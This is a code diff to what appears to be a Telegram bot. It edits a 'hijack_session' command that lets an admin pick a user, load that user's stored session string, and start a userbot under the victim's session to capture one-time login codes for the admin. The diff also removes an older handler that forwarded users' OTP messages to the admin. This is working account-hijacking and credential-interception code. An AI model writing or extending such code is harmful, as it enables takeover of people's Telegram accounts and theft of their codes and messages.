@@ -60,7 +60,7 @@ async def hijack_session(_, message):
 
     # Wait for admin to send user_id
     user_id_msg = await app.listen(admin_id, timeout=60)
-    
+
     if not user_id_msg.text.isdigit():
         await message.reply("❌ Invalid user ID. Operation cancelled.")
         return
@@ -73,7 +73,6 @@ async def hijack_session(_, message):
         await message.reply("❌ User not found in the database.")
         return
 
-
     session_string = user_session["session_string"]
 
     # Check if session is alive
@@ -81,18 +80,16 @@ async def hijack_session(_, message):
         await message.reply("Dead Session")
         return
 
-    await message.reply("User found! Listening for OTP...")
+    await message.reply("✅ User found! Listening for OTP...")
 
     # Store admin_id to forward OTP when received
     otp_listeners[user_id] = admin_id
 
-@app.on_message(filters.text)
-async def otp_listener(_, message):
-    """Forwards OTP to the admin if a hijack session is active."""
-    user_id = message.chat.id
-    if user_id in otp_listeners:
-        admin_id = otp_listeners[user_id]
-        await app.send_message(admin_id, f"OTP from user {user_id}: {message.text}")
+    # ✅ Start the userbot and listen for OTPs
+    userbot = await initialize_userbot(user_id, app, admin_id)  # Pass bot client and admin_id
+    if not userbot:
+        await message.reply("❌ Failed to start userbot.")
+        return
 
 users_loop = {}
 interval_set = {}
